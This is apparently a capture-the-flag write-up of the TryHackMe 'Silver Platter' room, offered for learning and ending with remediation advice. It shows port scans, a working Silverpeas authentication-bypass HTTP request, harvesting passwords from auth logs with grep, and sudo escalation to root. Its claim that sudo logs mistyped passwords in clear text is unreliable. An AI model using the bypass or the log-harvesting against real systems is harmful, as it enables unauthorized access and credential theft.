# TryHackMe - Silver Platter Writeup

**Room:** Silver Platter  
**Difficulty:** Easy  
**Date:** February 16, 2026  
**Author:** D24yK4r4

---

## Summary

This room demonstrates a full compromise of a web server running vulnerable Nginx and Silverpeas collaboration platform. The attack chain involves:
1. Reconnaissance to identify vulnerable services
2. Exploiting Silverpeas authentication bypass via Burp Suite
3. Discovering SSH credentials in internal messages
4. Privilege escalation via clear-text password in auth logs
5. Root access through sudo permissions

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- 10.82.158.158
```

**Results:**
- **22/tcp** - SSH (OpenSSH 8.9p1 Ubuntu)
- **80/tcp** - HTTP (nginx 1.18.0 Ubuntu)
- **8080/tcp** - HTTP-proxy

Key findings:
- Nginx version 1.18.0 is EOL (End of Life)
- Multiple services exposed

### Directory Enumeration (Port 80)

```bash
gobuster dir -u http://10.82.158.158 -w /usr/share/wordlists/dirb/common.txt
```

**Discovered endpoints:**
- `/assets/` (Status: 301 → 403 Forbidden)
- `/images/` (Status: 301 → 403 Forbidden)
- `/console` (Status: 302 - Redirect)

### Directory Enumeration (Port 8080)

```bash
gobuster dir -u http://10.82.158.158:8080/silverpeas/ -w /usr/share/wordlists/dirb/common.txt
```

**Discovered endpoints:**
- `/proxy` (Status: 200)
- `/repository` (Status: 500)

### Vulnerability Scanning

```bash
nuclei -u http://10.82.158.158
```

**Key findings:**
- **nginx/1.18.0** - End of Life version
- **CVE-2023-48795** - Terrapin (SSH vulnerability)
- Multiple missing security headers

---

## Web Application Analysis

### Main Website (Port 80)

Visiting `http://10.82.158.158` reveals a website for "Hack Smarter Security".

**HTML Source Analysis:**

Key information discovered in the Contact section:
```html
<article id="contact">
    <h2 class="major">Contact</h2>
    <p>If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. 
       His username is "scr1ptkiddy".</p>
</article>
```

**Important findings:**
- Platform: **Silverpeas**
- Username: **scr1ptkiddy**
- Founder: **Tyler Ramsbey** (mentioned in About section)

### Silverpeas Login (Port 8080)

Navigating to `http://10.82.158.158:8080/silverpeas` presents a login page.

---

## Initial Access - Silverpeas Authentication Bypass

### Vulnerability Research

A quick Google search reveals that **Silverpeas has a known authentication bypass** vulnerability that can be exploited using Burp Suite.

### Exploitation Steps

1. **Intercept Login Request with Burp Suite:**
   - Open Burp Suite and configure browser proxy
   - Navigate to `http://10.82.158.158:8080/silverpeas`
   - Enter any credentials (e.g., `SilverAdmin` / `test`)
   - Intercept the POST request to `/silverpeas/AuthenticationServlet`

2. **Modify the Request:**
   
   Original request:
   ```http
   POST /silverpeas/AuthenticationServlet HTTP/1.1
   Host: 10.82.158.158:8080
   Content-Type: application/x-www-form-urlencoded
   
   Login=SilverAdmin&Password=test&DomainId=0
   ```

   **Modified request (bypass):**
   ```http
   POST /silverpeas/Main HTTP/1.1
   Host: 10.82.158.158:8080
   Content-Type: application/x-www-form-urlencoded
   
   Login=SilverAdmin&DomainId=0
   ```

   Key modification: Change the endpoint from `/AuthenticationServlet` to `/Main` and remove the `Password` parameter.

3. **Forward the Request:**
   - The authentication is bypassed
   - You are now logged into Silverpeas as `SilverAdmin`

---

## User Flag - SSH Credentials Discovery

### Exploring Silverpeas

After successfully logging in, explore the Silverpeas interface.

**Navigate to Messages/Inbox:**
- Look for internal messages
- One message contains SSH credentials in clear text

**Discovered credentials:**
```
Username: tim
Password: [password found in messages]
```

### SSH Access

```bash
ssh tim@10.82.158.158
```

Enter the password found in Silverpeas messages.

**User flag location:**
```bash
cat ~/user.txt
```

🚩 **User Flag obtained!**

---

## Privilege Escalation

### Enumeration

Check current user privileges:
```bash
id
```

Output shows the user is in the **adm** group:
```
uid=1000(tim) gid=1000(tim) groups=1000(tim),4(adm)
```

The **adm group** has read access to system logs in `/var/log/`.

### Log Analysis

Members of the `adm` group can read authentication logs:

```bash
cat /var/log/auth* | grep -i pass
```

**Finding:**
The auth.log contains multiple sudo-related entries. Critically, when examining the logs, we find entries showing **sudo incorrect password attempts** where Tyler's actual password was logged in clear text. This happens when a user mistypes their password during sudo authentication - the system logs the failed attempt along with what was entered.

**Discovered credentials:**
```
Username: tyler
Password: [clear-text password from sudo incorrect password attempts]
```

### Lateral Movement

Switch to the Tyler user:
```bash
su tyler
```

Enter the password found in the auth.log.

### Sudo Privileges

Check sudo permissions:
```bash
sudo -l
```

**Output:**
```
User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

Tyler can run **any command as root** with sudo!

### Root Access

Escalate to root:
```bash
sudo su
```

or

```bash
sudo -i
```

**Root flag location:**
```bash
cat /root/root.txt
```

🚩 **Root Flag obtained!**

---

## Flags

- **User Flag:** Located at `/home/tim/user.txt`
- **Root Flag:** Located at `/root/root.txt`

---

## Key Takeaways

1. **Outdated Software:** Nginx 1.18.0 is EOL and may contain vulnerabilities
2. **Authentication Bypass:** Silverpeas has a simple authentication bypass exploitable via request manipulation
3. **Information Disclosure:** Credentials stored in clear text in messages
4. **Log Security:** Auth logs containing sensitive information accessible to adm group
5. **Sudo Misconfiguration:** Overly permissive sudo rules allowing full root access

---

## Remediation

1. **Update nginx** to the latest stable version
2. **Patch Silverpeas** or implement proper authentication controls
3. **Avoid storing credentials** in clear text in any application
4. **Restrict log access** - review group memberships and file permissions
5. **Follow principle of least privilege** for sudo configurations
6. **Implement password policies** to prevent weak or exposed credentials

---

## Tools Used

- **nmap** - Port scanning and service enumeration
- **gobuster** - Directory brute-forcing
- **nuclei** - Vulnerability scanning
- **Burp Suite** - HTTP request interception and modification
- **ssh** - Remote access
- **Standard Linux commands** - Enumeration and privilege escalation

---

**Date Completed:** February 16, 2026  
**Difficulty Rating:** Easy   
**Author:** D24yK4r4

---

*This writeup is for educational purposes only. Always obtain proper authorization before conducting security testing.*
